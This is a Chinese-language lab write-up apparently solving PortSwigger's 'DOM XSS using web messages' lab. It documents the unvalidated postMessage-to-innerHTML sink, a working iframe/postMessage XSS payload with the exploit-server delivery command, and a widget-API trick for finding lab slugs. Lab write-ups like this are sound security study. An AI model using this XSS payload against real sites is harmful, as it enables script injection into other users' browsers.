---
title: "lab-dom-xss-using-web-messages"
links:
  - target: dom-xss-family
    relation: evidences
---

# lab-dom-xss-using-web-messages

> evidences: [[dom-xss-family]]

- 题面:DOM XSS using web messages(/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
- 实例:https://0ac300bc0300c218831937f300e900d8.web-security-academy.net
- 利用服务器:https://exploit-0a4e00a603a5c266835836f701fc003b.exploit-server.net
- slug(真):请求 slug `…/controlling-the-web-message-source/lab-web-message-manipulation-using-a-handcrafted-vott` **404**;
  经 widget 解析得真 slug 与 lab_id(见下)。
- 判定目标:用 exploit server postMessage 使目标 `print()`;状态:**solved**(交付后 solved_check true)

## 关键步

1. 首页有 `window.addEventListener('message', e => document.getElementById('ads').innerHTML = e.data)`——无 origin 校验,
   sink = `#ads.innerHTML`。
2. 本地验证:lab_alert 首页 + driver `window.postMessage('<img src=1 onerror=alert(1)>','*')` → alert 实发。
3. 投递 payload:`<iframe src="https://<inst>/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>`
   (靶场页无 X-Frame-Options,可框)。

## widget 解析(requests slug 404 时的取真 slug 法)

```
POST https://portswigger.net/api/widgets
  Widget-Source: /web-security/dom-based
  body [{"widgetId":"academy-labstatus","additionalData":{"widget-lab-id":"CE814BAE27379E097E9D714CFB763781F05932D2B95C2B194386687A89F6E2AC"}}, …]
 -> Html 内 <a href="/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages">DOM XSS using web messages</a>
lab_id = CE814BAE27379E097E9D714CFB763781F05932D2B95C2B194386687A89F6E2AC
```

## 证据摘录

```
lab_alert "<inst>/" --settle-ms 2500 --driver "window.postMessage('<img src=1 onerror=alert(1)>','*')"
 -> {"alerts":["alert:1"],"fired":true}
# 交付(DELIVER_TO_VICTIM --follow);exploit log 见 (Victim) Chrome GET /exploit/
solved_check "<inst>/" --jar /tmp/b15-jar4.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch CE814BAE27379E097E9D714CFB763781F05932D2B95C2B194386687A89F6E2AC --widget-source /web-security/dom-based/controlling-the-web-message-source --jar /tmp/b15-jar4.json
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=<iframe src="https://<inst>/" onload="this.contentWindow.postMessage(&#39;<img src=1 onerror=print()>&#39;,&#39;*&#39;)"></iframe>' --form formAction=DELIVER_TO_VICTIM --follow
solved_check "<inst>/" --jar /tmp/b15-jar4.json
```
